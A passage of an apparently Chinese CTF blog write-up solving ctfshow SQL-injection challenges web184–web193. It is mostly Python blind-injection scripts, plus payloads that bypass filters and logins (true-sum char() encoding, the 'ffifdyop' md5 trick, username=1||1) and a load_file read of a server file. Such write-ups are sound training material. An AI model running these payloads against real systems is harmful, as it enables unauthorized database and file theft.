= <span class="string">"ctfshow"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">     print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">     <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = <span class="string">"0x"</span> + to_hex(flag + j + <span class="string">"%"</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">             <span class="string">"tableName"</span>:<span class="string">"ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;0&#125;"</span>.format(result)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"$user_count = 43"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">             flag += j</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686F7725</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730140931041.png" alt="image-20210730140931041"></p>
</blockquote>
<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><blockquote>
<ul>
<li>这次直接过滤了0-9的所有数字，上个脚本进行改变</li>
</ul>
</blockquote>
<p><strong>这次我们利用true来进行替换数字</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select true+true;</span><br><span class="line">结果是2</span><br><span class="line">所以我们构造数字c来进行like匹配</span><br></pre></td></tr></table></figure></div>

<p><strong>我们还是用like模糊匹配，然后利用concat连接true形成的字符和数字</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730151426812.png" alt="image-20210730151426812"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">tableName=ctfshow_user as a right join ctfshow_user as b on b.pass like concat(char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true),char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730151523656.png" alt="image-20210730151523656"></p>
<p><strong>页面可以正常回显，代码跑起py</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNum</span><span class="params">(n)</span>:</span></span><br><span class="line">    num=<span class="string">'true'</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"true"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">            num+=<span class="string">"+true"</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="comment">#把每一个字符转换成ascii码对应的数值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    str=<span class="string">""</span></span><br><span class="line">    str+=<span class="string">"char("</span>+createNum(ord(s[<span class="number">0</span>]))+<span class="string">")"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        str+=<span class="string">",char("</span>+createNum(ord(i))+<span class="string">")"</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://e0482185-09dd-40c6-854f-6df23ac4c58b.challenge.ctf.show:8080/select-waf.php"</span></span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">"ctfshow"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = change_str(flag + j + <span class="string">"%"</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"tableName"</span>:<span class="string">"ctfshow_user as a right join ctfshow_user as b on b.pass like (concat(&#123;&#125;))"</span>.format(result)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"$user_count = 43"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">             flag += j</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730153336499.png" alt="image-20210730153336499"></p>
<h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><blockquote>
<ul>
<li>和上一题一样</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNum</span><span class="params">(n)</span>:</span></span><br><span class="line">    num=<span class="string">'true'</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"true"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">            num+=<span class="string">"+true"</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="comment">#把每一个字符转换成ascii码对应的数值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    str=<span class="string">""</span></span><br><span class="line">    str+=<span class="string">"char("</span>+createNum(ord(s[<span class="number">0</span>]))+<span class="string">")"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        str+=<span class="string">",char("</span>+createNum(ord(i))+<span class="string">")"</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://e0482185-09dd-40c6-854f-6df23ac4c58b.challenge.ctf.show:8080/select-waf.php"</span></span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">"ctfshow"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = change_str(flag + j + <span class="string">"%"</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"tableName"</span>:<span class="string">"ctfshow_user as a right join ctfshow_user as b on b.pass like (concat(&#123;&#125;))"</span>.format(result)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"$user_count = 43"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">             flag += j</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730154141902.png" alt="image-20210730154141902"></p>
</blockquote>
<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = md5($_POST[<span class="string">'password'</span>],<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin可以获得flag</span></span><br><span class="line"><span class="keyword">if</span>($username!=<span class="string">'admin'</span>)&#123;</span><br><span class="line">	$ret[<span class="string">'msg'</span>]=<span class="string">'用户名不存在'</span>;</span><br><span class="line">   <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>登陆窗口，看返回逻辑</li>
</ul>
</blockquote>
<p><strong>很明显注入点是md5()函数这里，后面用了参数true，返回的是一个16位二进制</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730155322904.png" alt="image-20210730155322904"></p>
<p>网上有一个字符串<code>ffifdyop</code>很特殊</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> md5(<span class="string">"ffifdyop"</span>,<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"><span class="string">'or'</span><span class="number">6</span>�]��!r,��b</span><br><span class="line"> 刚好成万能密码</span><br><span class="line">  password=<span class="string">''</span><span class="keyword">or</span> <span class="keyword">true</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730155234977.png" alt="image-20210730155234977"></p>
<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"> $sql = "<span class="keyword">select</span> pass <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username = &#123;$username&#125;<span class="string">";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//密码判断</span></span><br><span class="line"><span class="string">  if($row['pass']==intval($password))&#123;</span></span><br><span class="line"><span class="string">      $ret['msg']='登陆成功';</span></span><br><span class="line"><span class="string">      array_push($ret['data'], array('flag'=&gt;$flag));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到是通过username来列出密码，然后弱比较来进行判断payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=0&amp;password=0</span><br></pre></td></tr></table></figure></div>

<p><strong>以这道题的数据库为例，这个数据库中的用户名都是以字母开头的数据，而以字母开头的数据在和数字比较时，会被强制转换为0，因此就会相等，后面的pass也是一样的道理</strong><br><strong>但注意，如果有某个数据不是以字母开头，是匹配不成功的，这种情况怎么办，我们可以用<code>||</code>运算符</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=1||1&amp;password=0</span><br></pre></td></tr></table></figure></div>

<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p><strong>因为确定一定包含ctfshow这个内容，所以通过load_file的返回值“\u67e5\u8be2\u5931\u8d25”判断是否存在，写个payload</strong></p>
<blockquote>
<p><strong>LOAD_FILE(file_name)：</strong> 读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。</p>
<p><strong>regexp：</strong> mysql中的正则表达式操作符</p>
</blockquote>
<p><strong>容易想到默认路径是<code>/var/www/html/api/index.php</code>，开始写个脚本进行盲注</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://e89f25b2-8acb-4c79-8368-56f445f77e6c.challenge.ctf.show:8080/api/index.php"</span></span><br><span class="line">str = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;"</span></span><br><span class="line">flag = <span class="string">"ctfshow&#123;"</span></span><br><span class="line">payload=<span class="string">"if(load_file('/var/www/html/api/index.php')regexp('&#123;0&#125;'),1,0)"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">666</span>):</span><br><span class="line">    print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">"username"</span>:payload.format(flag + j),</span><br><span class="line">            <span class="string">"password"</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r"\u67e5\u8be2\u5931\u8d25"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">'&#125;'</span>:</span><br><span class="line">            print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730180926218.png" alt="image-20210730180926218"></p>
<h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><blockquote>
<p>经典盲注，脚本跑</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://17f404c9-b645-40ab-8daf-f60c335e2d84.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890-=!@#$%^&amp;*()_+`~ qwertyuiopasdfghjklzxcvbnm[];,./&#123;&#125;:&lt;&gt;?\|"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#查表 payload="admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line"><span class="comment">#查字段 payload="admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">payload=<span class="string">"admin' and if(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="comment"># admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',1,0)#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"username"</span>:payload.format(i,j),</span><br><span class="line">              <span class="string">"password"</span>:<span class="number">123456</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">             flag += j</span><br><span class="line">             n+=<span class="number">1</span></span><br><span class="line">             print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730190843467.png" alt="image-20210730190843467"></p>
</blockquote>
<h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><blockquote>
<ul>
<li>和上题一样，过滤了ascii等，不过我写的payload没用</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://17f404c9-b645-40ab-8daf-f60c335e2d84.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890-=!@#$%^&amp;*()_+`~ qwertyuiopasdfghjklzxcvbnm[];,./&#123;&#125;:&lt;&gt;?\|"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#查表 payload="admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line"><span class="comment">#查字段 payload="admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">payload=<span class="string">"admin' and if(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="comment"># admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',1,0)#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"username"</span>:payload.format(i,j),</span><br><span class="line">              <span class="string">"password"</span>:<span class="number">123456</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r"\u5bc6\u7801\u9519\u8bef"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">             flag += j</span><br><span class="line">             n+=<span class="number">1</span></span><br><span class="line">             print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730191215328.png" alt="image-20210730191215328"></p>
</blockquote>
<h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><blockquote>
<ul>
<li>和上题一样，没办=号，我们依旧潇洒</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8ab877db-cd5c-424f-bb9c-0f54ba6447c7.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890-=!@#$%^&amp;*()_+`~ qwertyuiopasdfghjklzxcvbnm[];,./&#123;&#125;:&lt;&gt;?\|"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#查表 payload="admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line"><span class="comment">#查字段 payload="admin' and if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">payload=<span class="string">"admin' and if(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="comment"># admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',1,0)#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"username"</span>:payload.format(i,j),</span><br><span class="line">              <span class="string">"password"</span>:<span class="number">123456</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"密码错误"</span> <span class="keyword">in</span> res.json()[<span class="string">'msg'</span>]:</span><br><span class="line">             flag += j</span><br><span class="line">             n+=<span class="number">1</span></span><br><span class="line">             print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><blockquote>
<ul>
<li>过滤了substr但是没有过滤正则啊，用正则^来匹配第一个</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://131ffba2-a367-4469-8421-e4c0d9877e37.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890qwertyuiopasdfghjklzxcvbnm&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#查表payload="admin' and if((select group_concat(table_name) from information_schema.tables where table_schema=database())regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line"><span class="comment">#查字段payload="admin' and if((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flxg')regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line">payload=<span class="string">"admin' and if((select group_concat(f1ag) from ctfshow_flxg)regexp('^&#123;&#125;'), 1, 0)#"</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="comment"># admin' and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',1,0)#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">              <span class="string">"username"</span>:payload.format(flag+j),</span><br><span class="line">              <span class="string">"password"</span>:<span class="number">123456</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"密码错误"</span> <span class="keyword">in</span> res.json()[<span class="string">'msg'</span>]:</span><br><span class="line">             flag += j</span><br><span class="line">             n+=<span class="number">1</span></span><br><span class="line">             print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">             print(flag)</span><br><span class="line">             <span class="keyword">if</span> j==<span class="string">"&#125;"</span>:</span><br><span class="line">                 print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                 exit()</span><br><span 